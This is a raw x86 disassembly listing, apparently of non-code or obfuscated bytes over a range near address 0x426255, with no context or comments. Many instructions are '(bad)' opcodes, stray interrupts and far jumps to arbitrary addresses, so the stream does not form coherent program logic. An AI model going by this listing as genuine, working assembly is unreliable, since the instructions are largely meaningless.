  426255:	test   al,0x63
  426257:	retf   
  426258:	rcr    BYTE PTR [eax+eax*4],cl
  42625b:	xchg   esi,eax
  42625c:	int    0xed
  42625e:	int    0x76
  426260:	dec    esp
  426261:	adc    ch,ch
  426263:	cmp    eax,0x5b808081
  426268:	cwde   
  426269:	call   0x2f35:0x86214966
  426270:	push   es
  426271:	mov    ecx,0xcd80804a
  426276:	jbe    0x4262a8
  426278:	inc    cx
  42627a:	and    DWORD PTR [esi-0x62f9d0cb],eax
  426280:	dec    edx
  426281:	add    BYTE PTR [eax-0x29128937],0x37
  426288:	ficom  WORD PTR [ebx]
  42628a:	pop    ebp
  42628b:	mov    ebp,0xa25230a
  426290:	jbe    0x4262a3
  426292:	leave  
  426293:	jbe    0x42624a
  426295:	xchg   ecx,eax
  426296:	aaa    
  426297:	ficom  WORD PTR [ebx]
  426299:	or     dh,BYTE PTR [esi-0x43]
  42629c:	int    0x76
  42629e:	mov    BYTE PTR [edx],cl
  4262a0:	jbe    0x426297
  4262a2:	int    0x76
  4262a4:	cmc    
  4262a5:	int    0x1
  4262a7:	mov    ebp,0xcd808081
  4262ac:	or     ch,0x80
  4262af:	or     dh,BYTE PTR [esi-0x7]
  4262b2:	pop    edi
  4262b3:	jle    0x4262ea
  4262b5:	add    BYTE PTR [eax-0x7fca69a3],0x80
  4262bc:	mov    eax,0x4b0760a
  4262c1:	ins    DWORD PTR es:[edi],dx
  4262c2:	(bad)  
  4262c3:	mov    eax,0xcda2760a
  4262c8:	sar    DWORD PTR [eax+0x5d15760a],cl
  4262ce:	(bad)  
  4262cf:	xor    eax,0xf1cd8080
  4262d4:	mov    eax,0xcf19960a
  4262d9:	nop
  4262da:	xchg   edx,eax
  4262db:	iret   
  4262dc:	sahf   
  4262dd:	(bad)  
  4262de:	int    0x99
  4262e0:	mov    eax,0xcd1d960a
  4262e5:	aad    0xb8
  4262e7:	or     dl,BYTE PTR [esi-0x662dfbdf]
  4262ed:	mov    eax,0xcf01960a
  4262f2:	jno    0x426348
  4262f4:	int    0x3
  4262f6:	mov    eax,0x40be60a
  4262fb:	leave  
  4262fc:	xchg   ebp,eax
  4262fd:	mov    eax,0xcf05e60a
  426302:	ficomp WORD PTR [eax-0x48]
  426305:	or     ah,dh
  426307:	pop    es
  426308:	mov    eax,0xb809760a
  42630d:	or     dl,dh
  42630f:	retf   0xc5cd
  426312:	mov    eax,0xb8cc760a
  426317:	or     dl,BYTE PTR [edi]
  426319:	ins    BYTE PTR es:[edi],dx
  42631a:	add    BYTE PTR [eax],al
  42631c:	add    BYTE PTR [ebp*2+0x60ab8d0],al
  426323:	push   edx
  426324:	add    BYTE PTR [eax],al
  426326:	add    bh,cl
  426328:	outs   dx,BYTE PTR ds:[esi]
  426329:	add    edi,DWORD PTR [eax+0x74060a]
  42632f:	add    BYTE PTR [eax],al
  426331:	add    al,0x6d
  426333:	inc    edx
  426334:	mov    eax,0x78060a
  426339:	add    BYTE PTR [eax],al
  42633b:	iret   
  42633c:	outs   dx,BYTE PTR ds:[esi]
  42633d:	xor    BYTE PTR [eax+0x7c060a],bh
  426343:	add    BYTE PTR [eax],al
  426345:	add    al,0x6d
  426347:	xor    bh,BYTE PTR [eax+0x8a060a]
  42634d:	add    BYTE PTR [eax],al
  42634f:	mov    eax,0x8ccf0a
  426354:	add    BYTE PTR [eax],al
  426356:	int    0xc5
  426358:	mov    eax,0x8e060a
  42635d:	add    BYTE PTR [eax],al
  42635f:	int    0x76
  426361:	in     eax,dx
  426362:	int    0x8d
  426364:	adc    DWORD PTR [edi],ebp
  426366:	inc    ebp
  426367:	jge    0x4262fb
  426369:	shr    ebx,cl
  42636b:	xchg   edx,eax
  42636c:	int    0x8d
  42636e:	in     eax,dx
  42636f:	int    0x96
  426371:	adc    ebx,eax
  426373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426374:	mov    esi,0xc93b4229
  426379:	cmp    ebx,edx
  42637b:	shl    edx,cl
  42637d:	sub    BYTE PTR [ebx-0x2e],dl
  426380:	in     al,dx
  426381:	outs   dx,BYTE PTR ds:[esi]
  426382:	iret   
  426383:	aam    0x76
  426385:	mov    al,0xb8
  426387:	int    0x4e
  426389:	das    
  42638a:	mov    ebx,0xcbbb2f18
  42638f:	cmp    ecx,DWORD PTR [edx+edx*1]
  426392:	sti    
  426393:	and    DWORD PTR ds:0xf3e38080,esi
  426399:	shl    edx,cl
  42639b:	das    
  42639c:	push   ebx
  42639d:	adc    ecx,DWORD PTR [ecx]
  42639f:	int3   
  4263a0:	test   DWORD PTR [ebp-0x32ffff01],esp
  4263a6:	lea    esi,[ebp+0x2fbd96cd]
  4263ac:	inc    ebp
  4263ad:	jecxz  0x426341
  4263af:	shl    ebx,cl
  4263b1:	xchg   edx,eax
  4263b2:	int    0x96
  4263b4:	mov    ch,0xcd
  4263b6:	(bad)  
  4263b7:	mov    ebp,0xf73bf03b
  4263bc:	push   ebx
  4263bd:	psrlq  mm5,mm2
  4263c0:	sub    BYTE PTR [edi-0x7906fb2d],al
  4263c6:	(bad)  
  4263c7:	popa   
  4263c8:	int    0x76
  4263ca:	in     eax,dx
  4263cb:	int    0x8d
  4263cd:	adc    DWORD PTR [edi],ebp
  4263cf:	inc    ebp
  4263d0:	jge    0x426364
  4263d2:	shr    ebx,cl
  4263d4:	xchg   edx,eax
  4263d5:	int    0x8d
  4263d7:	in     eax,dx
  4263d8:	int    0x96
  4263da:	adc    DWORD PTR [ebx],edi
  4263dc:	leave  
  4263dd:	cmp    ebx,edx
  4263df:	shl    edx,cl
  4263e1:	sub    BYTE PTR [ebx-0x2e],dl
  4263e4:	in     al,dx
  4263e5:	outs   dx,BYTE PTR ds:[esi]
  4263e6:	iret   
  4263e7:	aam    0x76
  4263e9:	add    DWORD PTR [eax-0x44d0b133],edi
  4263ef:	sbb    BYTE PTR [edi],ch
  4263f1:	mov    ebx,0x120c3bcb
  4263f6:	sti    
  4263f7:	and    DWORD PTR ds:0xf3e38080,esi
  4263fd:	shl    edx,cl
  4263ff:	das    
  426400:	push   ebx
  426401:	adc    ecx,DWORD PTR [ecx]
  426403:	int3   
  426404:	test   esp,ecx
  426406:	inc    DWORD PTR [eax]
  426408:	add    ch,cl
  42640a:	lea    esi,[ebp+0x2fbd96cd]
  426410:	inc    ebp
  426411:	jecxz  0x4263a5
  426413:	shl    ebx,cl
  426415:	xchg   edx,eax
  426416:	int    0x96
  426418:	mov    ch,0xcd
  42641a:	(bad)  
  42641b:	mov    ebp,0xf73bf03b
  426420:	push   ebx
  426421:	psrlq  mm5,mm2
  426424:	sub    BYTE PTR [edi-0x7406fb2d],al
  42642a:	(bad)  
  42642b:	popa   
  42642c:	int    0x76
  42642e:	in     eax,dx
  42642f:	int    0x8d
  426431:	adc    DWORD PTR [edi],ebp
  426433:	inc    ebp
  426434:	jge    0x4263c8
  426436:	shr    ebx,cl
  426438:	xchg   edx,eax
  426439:	int    0x8d
  42643b:	in     eax,dx
  42643c:	int    0x96
  42643e:	adc    DWORD PTR [ebx],edi
  426440:	leave  
  426441:	cmp    ebx,edx
  426443:	shl    edx,cl
  426445:	sub    BYTE PTR [ebx-0x2e],dl
  426448:	in     al,dx
  426449:	je     0x42641a
  42644b:	push   ebp
  42644c:	jbe    0x4264ba
  42644e:	add    BYTE PTR [eax],al
  426450:	add    BYTE PTR [eax-0x44d0b133],bh
  426456:	sbb    BYTE PTR [edi],ch
  426458:	mov    ebx,0x120c3bcb
  42645d:	sti    
  42645e:	and    DWORD PTR ds:0xf3e38080,esi
  426464:	shl    edx,cl
  426466:	das    
  426467:	push   ebx
  426468:	adc    ecx,DWORD PTR [ecx]
  42646a:	int3   
  42646b:	test   DWORD PTR ds:0xcd0000ff,eax
  426471:	lea    esi,[ebp+0x2fbd96cd]
  426477:	inc    ebp
  426478:	jecxz  0x42640c
  42647a:	shl    ebx,cl
  42647c:	xchg   edx,eax
  42647d:	int    0x96
  42647f:	mov    ch,0xcd
  426481:	(bad)  
  426482:	mov    ebp,0xf73bf03b
  426487:	push   ebx
  426488:	psrlq  mm5,mm2
  42648b:	sub    BYTE PTR [edi-0x7706fb2d],al
  426491:	(bad)  
  426492:	mov    ebx,0xffb506cf
  426497:	add    BYTE PTR [eax],al
  426499:	or     dh,BYTE PTR [esi-0x7]
  42649c:	int    0x76
  42649e:	stc    
  42649f:	pop    edi
  4264a0:	inc    esi
  4264a1:	pop    esp
  4264a2:	inc    ebp
  4264a3:	xchg   edi,eax
  4264a4:	or     cl,BYTE PTR [eax+0x79245161]
  4264aa:	daa    
  4264ab:	or     dh,BYTE PTR [eax-0x7c]
  4264ae:	int    0x6
  4264b0:	mov    ch,0xff
  4264b2:	add    BYTE PTR [eax],al
  4264b4:	int    0x57
  4264b6:	mov    ebp,0xa0000ff
  4264bb:	(bad)  
  4264bc:	mov    ebp,0x8621d169
  4264c1:	xor    eax,0x62fd343
  4264c6:	pusha  
  4264c7:	add    DWORD PTR [eax-0x4269a180],0x8151062f
  4264d1:	add    BYTE PTR [eax-0x7fca76a3],0x80
  4264d8:	mov    eax,0xfff9060a
  4264dd:	add    BYTE PTR [eax],al
  4264df:	int    0xc5
  4264e1:	mov    eax,0xff03060a
  4264e6:	add    BYTE PTR [eax],al
  4264e8:	pop    ebp
  4264e9:	es xor eax,0xab88080
  4264ef:	push   es
  4264f0:	std    
  4264f1:	inc    DWORD PTR [eax]
  4264f3:	add    BYTE PTR [ebp-0x5d],bl
  4264f6:	xor    eax,0xab88080
  4264fb:	push   es
  4264fc:	(bad)  
  4264fd:	inc    DWORD PTR [eax]
  4264ff:	add    BYTE PTR [ebp+0x1e],bl
  426502:	xor    eax,0xab88080
  426507:	push   es
  426508:	add    BYTE PTR [eax],0x0
  42650b:	add    BYTE PTR [ebp*2-0x47823218],al
  426512:	or     cl,bh
  426514:	xchg   edx,eax
  426515:	add    BYTE PTR [eax],al
  426517:	add    ch,cl
  426519:	jbe    0x42654b
  42651b:	pop    edi
  42651c:	dec    ebx
  42651d:	xor    eax,0xab88080
  426522:	iret   
  426523:	test   BYTE PTR [eax],al
  426525:	add    BYTE PTR [eax],al
  426527:	add    al,0xd3
  426529:	bound  edi,QWORD PTR [eax+0x86cf0a]
  42652f:	add    BYTE PTR [eax],al
  426531:	pop    edi
  426532:	push   esi
  426533:	xor    eax,0xab88080
  426538:	iret   
  426539:	mov    BYTE PTR [eax],al
  42653b:	add    BYTE PTR [eax],al
  42653d:	add    al,0xd3
  42653f:	pushf  
  426540:	mov    eax,0x4acf0a
  426545:	add    BYTE PTR [eax],al
  426547:	int    0xc
  426549:	mov    eax,0x4ccf0a
  42654e:	add    BYTE PTR [eax],al
  426550:	pop    edi
  426551:	add    al,0x35
  426553:	add    BYTE PTR [eax+0x4ecf0ab8],0x0
  42655a:	add    BYTE PTR [eax],al
  42655c:	cmp    edi,DWORD PTR [ecx+0x5f]
  42655f:	adc    DWORD PTR [eax-0x80],edx
  426562:	cmp    BYTE PTR [eax+0x30cf0a],0x0
  426569:	add    bl,dl
  42656b:	mov    ebp,0x151a5f92
  426570:	add    BYTE PTR [eax+0x22cf0ab8],0x0
  426577:	add    BYTE PTR [eax],al
  426579:	pop    edi
  42657a:	call   0xcf0a:0xb88080eb
  426581:	adc    al,0x0
  426583:	add    BYTE PTR [eax],al
  426585:	int    0x8d
  426587:	xor    BYTE PTR [edx+eax*1],al
  42658a:	call   ebx
  42658c:	repnz sub BYTE PTR [ebx-0x2d],dl
  426590:	or     al,BYTE PTR [esi]
  426592:	adc    eax,0xcd0000ff
  426597:	jbe    0x4265e5
  426599:	int    0x8d
  42659b:	dec    esp
  42659c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42659f:	mov    ebp,0xff020492
  4265a4:	shl    edx,cl
  4265a6:	sub    BYTE PTR [ebx-0x2d],dl
  4265a9:	leave  
  4265aa:	add    eax,0xff1d06
  4265af:	add    BYTE PTR [eax],al
  4265b1:	add    BYTE PTR [eax+0x1506cf80],al
  4265b7:	inc    DWORD PTR [eax]
  4265b9:	add    BYTE PTR [eax-0x33],dh
  4265bc:	jbe    0x4265ee
  4265be:	int    0x8d
  4265c0:	xor    BYTE PTR [ebx],bh
  4265c2:	jns    0x426597
  4265c4:	mov    ebp,0xff020492
  4265c9:	shl    edx,cl
  4265cb:	sub    BYTE PTR [ebx-0x2d],dl
  4265ce:	jo     0x42659f
  4265d0:	push   es
  4265d1:	stc    
  4265d2:	inc    DWORD PTR [eax]
  4265d4:	add    BYTE PTR [eax-0x33],dh
  4265d7:	jbe    0x4265ce
  4265d9:	int    0x1
  4265db:	cmp    eax,0xc9808081
  4265e0:	push   es
  4265e1:	sbb    BYTE PTR [eax],al
  4265e3:	add    BYTE PTR [eax],al
  4265e5:	inc    eax
  4265e6:	retf   
  4265e7:	fwait
  4265e8:	xor    eax,0x76cd5000
  4265ed:	adc    al,0x0
  4265ef:	icebp  
  4265f0:	or     dh,BYTE PTR [esi-0x7]
  4265f3:	int    0x76
  4265f5:	stc    
  4265f6:	push   es
  4265f7:	ins    DWORD PTR es:[edi],dx
  4265f8:	aam    0x4a
  4265fa:	adc    dl,BYTE PTR [esi+0x68]
  4265fd:	or     BYTE PTR [ebx+ecx*1],bl
  426600:	fmul   QWORD PTR [ebx-0x17]
  426603:	(bad)  
  426604:	int    0x8d
  426606:	dec    esp
  426607:	int    0x96
  426609:	dec    esp
  42660a:	sar    bh,0x3b
  42660d:	setl   BYTE PTR [ebx]
  426610:	icebp  
  426611:	shr    edx,cl
  426613:	sub    bl,dl
  426615:	jmp    0x4265a9
  426617:	push   ebx
  426618:	adc    ecx,ebp
  42661a:	xchg   esi,eax
  42661b:	cmc    
  42661c:	int    0xa2
  42661e:	and    eax,0x5e808081
  426623:	dec    edx
  426624:	das    
  426625:	push   es
  426626:	popa   
  426627:	test   DWORD PTR [eax+0x4c8dcd80],eax
  42662d:	int    0x96
  42662f:	dec    esp
  426630:	cmp    ecx,DWORD PTR [edi]
  426632:	shr    ebx,cl
  426634:	xchg   edx,eax
  426635:	cmp    esi,ecx
  426637:	shr    edx,cl
  426639:	sub    BYTE PTR [ebx+0x13],dl
  42663c:	int    0x96
  42663e:	cmc    
  42663f:	int    0xa2
  426641:	in     al,0x81
  426643:	add    BYTE PTR [eax-0x7232b5f6],0x4c
  42664a:	int    0x96
  42664c:	dec    esp
  42664d:	cmp    ecx,DWORD PTR [edi]
  42664f:	shr    ebx,cl
  426651:	xchg   edx,eax
  426652:	cmp    esi,ecx
  426654:	shr    edx,cl
  426656:	sub    BYTE PTR [ebx+0x13],dl
  426659:	int    0x96
  42665b:	cmc    
  42665c:	int    0xa2
  42665e:	add    DWORD PTR [ecx+0x4a0a8080],eax
  426664:	pop    edi
  426665:	xor    ax,0x8080
  426669:	mov    eax,0x24cf0a
  42666e:	add    BYTE PTR [eax],al
  426670:	int    0xc
  426672:	mov    eax,0x28cf0a
  426677:	add    BYTE PTR [eax],al
  426679:	pop    edi
  42667a:	es xor eax,0xab88080
  426680:	iret   
  426681:	sub    al,0x0
  426683:	add    BYTE PTR [eax],al
  426685:	pop    edi
  426686:	daa    
  426687:	xor    eax,0xab88080
  42668c:	iret   
  42668d:	xor    al,BYTE PTR [eax]
  42668f:	add    BYTE PTR [eax],al
  426691:	add    al,0xd3
  426693:	test   eax,0x34cf0ab8
  426698:	add    BYTE PTR [eax],al
  42669a:	add    BYTE PTR [edi-0x69],bl
  42669d:	xor    eax,0xab88080
  4266a2:	iret   
  4266a3:	cmp    BYTE PTR [eax],al
  4266a5:	add    BYTE PTR [eax],al
  4266a7:	add    al,0xd3
  4266a9:	mov    dl,0xb8
  4266ab:	or     cl,bh
  4266ad:	cmp    al,0x0
  4266af:	add    BYTE PTR [eax],al
  4266b1:	pop    edi
  4266b2:	fwait
  4266b3:	xor    eax,0xab88080
  4266b8:	iret   
  4266b9:	inc    eax
  4266ba:	add    BYTE PTR [eax],al
  4266bc:	add    ch,cl
  4266be:	or     al,0xb8
  4266c0:	or     cl,bh
  4266c2:	inc    esp
  4266c3:	add    BYTE PTR [eax],al
  4266c5:	add    BYTE PTR [edi+0x17],bl
  4266c8:	xor    eax,0xab88080
  4266cd:	iret   
  4266ce:	dec    eax
  4266cf:	add    BYTE PTR [eax],al
  4266d1:	add    BYTE PTR [edi+0x26],bl
  4266d4:	pop    esi
  4266d5:	add    BYTE PTR [eax+0x50cf0ab8],0x0
  4266dc:	add    BYTE PTR [eax],al
  4266de:	pop    edi
  4266df:	cmp    esi,DWORD PTR [edx]
  4266e1:	add    BYTE PTR [eax+0x42cf0ab8],0x0
  4266e8:	add    BYTE PTR [eax],al
  4266ea:	jns    0x426762
  4266ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266ee:	pop    edi
  4266ef:	pop    esp
  4266f0:	adc    eax,0xab88080
  4266f5:	iret   
  4266f6:	push   esp
  4266f7:	add    BYTE PTR [eax],al
  4266f9:	add    BYTE PTR [ebx+edx*8],al
  4266fc:	pop    esp
  4266fd:	mov    eax,0x58cf0a
  426702:	add    BYTE PTR [eax],al
  426704:	jns    0x42677c
  426706:	fisttp WORD PTR [ecx+0x79]
  426709:	jbe    0x4266b4
  42670b:	inc    ecx
  42670c:	jns    0x426784
  42670e:	loope  0x4266b3
  426710:	pop    edi
  426711:	fcom   st(4)
  426713:	add    BYTE PTR [eax+0x5ccf0ab8],0x0
  42671a:	add    BYTE PTR [eax],al
  42671c:	jns    0x426794
  42671e:	lods   eax,DWORD PTR ds:[esi]
  42671f:	push   edi
  426720:	pop    edi
  426721:	jnp    0x426778
  426723:	add    BYTE PTR [eax+0x60cf0ab8],0x0
  42672a:	add    BYTE PTR [eax],al
  42672c:	jns    0x4267a4
  42672e:	repnz cmp DWORD PTR [ecx+0x76],edi
  426732:	jmp    0x8080:0x35a15f47
  426739:	mov    eax,0x64cf0a
  42673e:	add    BYTE PTR [eax],al
  426740:	jns    0x4267b8
  426742:	in     eax,0x18
  426744:	int    0x8d
  426746:	xor    ch,cl
  426748:	xchg   esi,eax
  426749:	xor    BYTE PTR [ebx],bh
  42674b:	(bad)  
  42674d:	icebp  
  42674e:	shr    ebx,cl
  426750:	xchg   edx,eax
  426751:	shr    edx,cl
  426753:	sub    BYTE PTR [ebx+0x13],dl
  426756:	in     al,dx
  426757:	xchg   esp,eax
  426758:	int    0x96
  42675a:	xor    ch,cl
  42675c:	out    0x30,al
  42675e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426764:	stc    
  426765:	shr    ecx,cl
  426767:	sub    BYTE PTR [ebx-0x27],dl
  42676a:	xor    edx,DWORD PTR [ebx]
  42676c:	das    
  42676d:	pop    ecx
  42676e:	mov    WORD PTR [ebp-0x5b],cs
  426771:	int    0x96
  426773:	xor    ch,cl
  426775:	out    0x30,al
  426777:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42677d:	stc    
  42677e:	shr    ecx,cl
  426780:	sub    BYTE PTR [ebx-0x27],dl
  426783:	int    0xe6
  426785:	stc    
  426786:	add    al,0x2
  426788:	adc    DWORD PTR [edx],0xffffffd3
  42678b:	fwait
  42678c:	add    BYTE PTR [eax+0x9033380],0x8c
  426793:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  426795:	int    0x96
  426797:	xor    ch,cl
  426799:	lea    esi,[eax]
  42679b:	cmp    ebx,DWORD PTR [ecx-0xd2c82c5]
  4267a1:	sub    bl,dl
  4267a3:	repz xchg edx,eax
  4267a5:	push   ebx
  4267a6:	jecxz  0x426775
  4267a8:	(bad)  
  4267a9:	stc    
  4267aa:	xchg   DWORD PTR [ebx],edx
  4267ac:	int    0x96
  4267ae:	xor    ch,cl
  4267b0:	out    0x30,al
  4267b2:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  4267b8:	xchg   edx,eax
  4267b9:	shr    ecx,cl
  4267bb:	sub    BYTE PTR [ebx-0x27],dl
  4267be:	add    al,0xd2
  4267c0:	mov    BYTE PTR [edx],cl
  4267c2:	(bad)  
  4267c3:	stc    
  4267c4:	inc    ebx
  4267c5:	adc    eax,DWORD PTR [edx+0x308dcdb0]
  4267cb:	int    0x96
  4267cd:	xor    BYTE PTR [ebx],bh
  4267cf:	(bad)  
  4267d1:	icebp  
  4267d2:	shr    ebx,cl
  4267d4:	xchg   edx,eax
  4267d5:	shr    edx,cl
  4267d7:	sub    BYTE PTR [ebx+0x13],dl
  4267da:	or     cl,bh
  4267dc:	adc    eax,0xcd0000ff
  4267e1:	lea    ecx,[ebp+ecx*8-0x6a]
  4267e5:	dec    esp
  4267e6:	cmp    ecx,DWORD PTR [edi]
  4267e8:	cmp    esi,ecx
  4267ea:	shr    edx,cl
  4267ec:	sub    bl,dl
  4267ee:	jmp    0x426782
  4267f0:	push   ebx
  4267f1:	adc    ecx,edi
  4267f3:	xchg   esi,eax
  4267f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267f5:	or     dl,BYTE PTR ds:0xff1dcf
  4267fb:	add    BYTE PTR [ecx+0x6b],ah
  4267fe:	xor    eax,0x13cd8080
  426803:	mov    eax,0x4258d0a
  426808:	rcl    edx,cl
  42680a:	int    0xfa
  42680c:	mov    eax,0xcf29e60a
  426811:	loopne 0x4267bc
  426813:	mov    eax,0x42de60a
  426818:	leave  
  426819:	test   BYTE PTR [eax-0x304d19f6],bh
  42681f:	loopne 0x426835
  426821:	mov    eax,0x435e60a
  426826:	leave  
  426827:	loop   0x4267e1
  426829:	or     ah,dh
  42682b:	cmp    ebp,ecx
  42682d:	cli    
  42682e:	mov    eax,0xcd3de60a
  426833:	add    edi,DWORD PTR [eax-0x32be19f6]
  426839:	cld    
  42683a:	mov    eax,0xcd45e60a
  42683f:	add    edi,DWORD PTR [eax-0x322f19f6]
  426845:	cli    
  426846:	mov    eax,0xcfc2e60a
  42684b:	loopne 0x426876
  42684d:	mov    eax,0x455e60a
  426852:	leave  
  426853:	test   BYTE PTR [eax-0x30a619f6],bh
  426859:	loopne 0x4267f0
  42685b:	mov    eax,0x45de60a
  426860:	leave  
  426861:	loop   0x42681b
  426863:	or     ah,dh
  426865:	popa   
  426866:	mov    eax,0xb8658d0a
  42686b:	or     dl,BYTE PTR [esi-0x47f33297]
  426871:	or     cl,BYTE PTR [ebp+0x4c8dcd6d]
  426877:	int    0x96
  426879:	dec    esp
  42687a:	cmp    esi,ecx
  42687c:	cmp    ecx,DWORD PTR [edi]
  42687e:	shr    edx,cl
  426880:	sub    bl,dl
  426882:	jmp    0x426816
  426884:	push   ebx
  426885:	adc    ecx,ebp
  426887:	xchg   esi,eax
  426888:	dec    esp
  426889:	int    0xe6
  42688b:	dec    esp
  42688c:	cmp    ebx,DWORD PTR [ecx-0x306d0c2d]
  426892:	mov    WORD PTR [ebp-0x2c06c430],cs
  426898:	jmp    0x301bbbc5
  42689d:	mov    ebx,0xb8d93b5e
  4268a2:	or     dh,BYTE PTR [ecx]
  4268a4:	int    0x8d
  4268a6:	dec    esp
  4268a7:	int    0x96
  4268a9:	dec    esp
  4268aa:	cmp    ecx,DWORD PTR [edi]
  4268ac:	cmp    esi,ecx
  4268ae:	shr    ebx,cl
  4268b0:	xchg   edx,eax
  4268b1:	shr    edx,cl
  4268b3:	sub    BYTE PTR [ebx+0x13],dl
  4268b6:	int    0x96
  4268b8:	dec    esp
  4268b9:	iret   
  4268ba:	mov    WORD PTR [ebp-0x3266c4db],cs
  4268c0:	out    0x4c,al
  4268c2:	shl    ebx,cl
  4268c4:	xchg   edx,eax
  4268c5:	cmp    edi,ecx
  4268c7:	shr    ecx,cl
  4268c9:	sub    BYTE PTR [ebx-0x27],dl
  4268cc:	das    
  4268cd:	mov    ebx,0xb8d93b5e
  4268d2:	or     dh,BYTE PTR [ecx]
  4268d4:	int    0x8d
  4268d6:	dec    esp
  4268d7:	int    0x96
  4268d9:	dec    esp
  4268da:	cmp    esi,ecx
  4268dc:	shr    edx,cl
  4268de:	sub    BYTE PTR [ebx],bh
  4268e0:	psrlq  mm5,mm3
  4268e3:	xchg   edx,eax
  4268e4:	push   ebx
  4268e5:	adc    ecx,ebp
  4268e7:	xchg   esi,eax
  4268e8:	dec    esp
  4268e9:	int    0xe6
  4268eb:	dec    esp
  4268ec:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4268f2:	stc    
  4268f3:	shr    ecx,cl
  4268f5:	sub    BYTE PTR [ebx-0x27],dl
  4268f8:	mov    eax,0x9096cc0a
  4268fd:	inc    DWORD PTR [eax]
  4268ff:	add    ch,cl
  426901:	lea    ecx,[ebp+ecx*8-0x6a]
  426905:	dec    esp
  426906:	cmp    esi,ecx
  426908:	shr    edx,cl
  42690a:	sub    BYTE PTR [ebx],bh
  42690c:	psrlq  mm5,mm3
  42690f:	xchg   edx,eax
  426910:	push   ebx
  426911:	adc    ecx,ebp
  426913:	xchg   esi,eax
  426914:	dec    esp
  426915:	int    0xe6
  426917:	dec    esp
  426918:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42691e:	stc    
  42691f:	shr    ecx,cl
  426921:	sub    BYTE PTR [ebx-0x27],dl
  426924:	mov    eax,0xa496cc0a
  426929:	inc    DWORD PTR [eax]
  42692b:	add    ch,cl
  42692d:	lea    esi,[eax]
  42692f:	int    0x96
  426931:	xor    BYTE PTR [ebx],bh
  426933:	icebp  
  426934:	cmp    ecx,DWORD PTR [edi]
  426936:	shr    edx,cl
  426938:	sub    bl,dl
  42693a:	jmp    0x4268ce
  42693c:	push   ebx
  42693d:	adc    ecx,ebp
  42693f:	xchg   esi,eax
  426940:	xor    ch,cl
  426942:	out    0x30,al
  426944:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  42694a:	xchg   edx,eax
  42694b:	shr    ecx,cl
  42694d:	sub    BYTE PTR [ebx-0x27],dl
  426950:	xchg   DWORD PTR [ebx],edx
  426952:	or     cl,bh
  426954:	adc    eax,0xcd0000ff
  426959:	lea    ecx,[ebp+ecx*8-0x6a]
  42695d:	dec    esp
  42695e:	int    0xe6
  426960:	mov    BYTE PTR [ebx],bh
  426962:	icebp  
  426963:	cmp    ecx,DWORD PTR [edi]
  426965:	shr    ebx,cl
  426967:	xchg   edx,eax
  426968:	shr    edx,cl
  42696a:	sub    BYTE PTR [ebx+0x13],dl
  42696d:	iret   
  42696e:	push   es
  42696f:	nop
  426970:	inc    DWORD PTR [eax]
  426972:	add    BYTE PTR [edx],cl
  426974:	add    eax,0xff1dcf
  426979:	add    bh,cl
  42697b:	jbe    0x42694d
  42697d:	mov    ebp,0x10d8
  426982:	int    0x8d
  426984:	xor    ch,cl
  426986:	xchg   esi,eax
  426987:	xor    al,al
  426989:	(bad)  
  42698a:	cmp    ecx,DWORD PTR [edi]
  42698c:	stos   BYTE PTR es:[edi],al
  42698d:	cmp    ebx,ecx
  42698f:	shr    ebx,cl
  426991:	xchg   edx,eax
  426992:	shr    edx,cl
  426994:	sub    BYTE PTR [ebx+0x13],dl
  426997:	or     al,BYTE PTR ds:0xff1dcf
  42699d:	add    ch,cl
  42699f:	jbe    0x4269ed
  4269a1:	int    0x8d
  4269a3:	dec    esp
  4269a4:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269a7:	mov    ebp,0xd3f03b92
  4269ac:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269b0:	aam    0x3c
  4269b2:	iret   
  4269b3:	push   es
  4269b4:	adc    eax,0x700000ff
  4269b9:	int    0x76
  4269bb:	xor    ch,cl
  4269bd:	lea    esi,[eax]
  4269bf:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269c2:	mov    ebp,0xd3f03b92
  4269c7:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269cb:	jo     0x42699c
  4269cd:	push   es
  4269ce:	and    al,0x0
  4269d0:	add    BYTE PTR [eax],al
  4269d2:	jo     0x4269a1
  4269d4:	jbe    0x4269ea
  4269d6:	rol    BYTE PTR [eax+0x76cdf100],0x4c
  4269dd:	int    0x8d
  4269df:	dec    esp
  4269e0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4269e3:	lock int 0xe6
  4269e6:	mov    bl,dl
  4269e8:	mov    ebp,0x28f2d392
  4269ed:	push   ebx
  4269ee:	ror    edi,cl
  4269f0:	iret   
  4269f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269f2:	inc    DWORD PTR [eax]
  4269f4:	add    BYTE PTR [edx],cl
  4269f6:	int3   
  4269f7:	push   es
  4269f8:	sbb    eax,0xcf0000ff
  4269fd:	jbe    0x426a24
  4269ff:	mov    ebp,0xeff5
  426a04:	int    0x8d
  426a06:	xor    ch,cl
  426a08:	xchg   esi,eax
  426a09:	xor    BYTE PTR [ebx],bh
  426a0b:	psrlq  mm5,mm3
  426a0e:	xchg   edx,eax
  426a0f:	add    al,0xfb
  426a11:	call   ebx
  426a13:	jmp    0xcf05:0xa135328
  426a1a:	sbb    eax,0x610000ff
  426a1f:	sub    esi,DWORD PTR ds:0x6a5d8080
  426a25:	xor    eax,0xab88080
  426a2a:	push   es
  426a2b:	jo     0x426a2d
  426a2d:	add    BYTE PTR [eax],al
  426a2f:	iret   
  426a30:	mov    dh,BYTE PTR [eax]
  426a32:	mov    eax,0xb4cf0a
  426a37:	add    BYTE PTR [eax],al
  426a39:	pop    ebp
  426a3a:	adc    BYTE PTR ds:0xab88080,dh
  426a40:	push   es
  426a41:	bound  eax,QWORD PTR [eax]
  426a43:	add    BYTE PTR [eax],al
  426a45:	int    0xd2
  426a47:	mov    eax,0x94060a
  426a4c:	add    BYTE PTR [eax],al
  426a4e:	int    0xd3
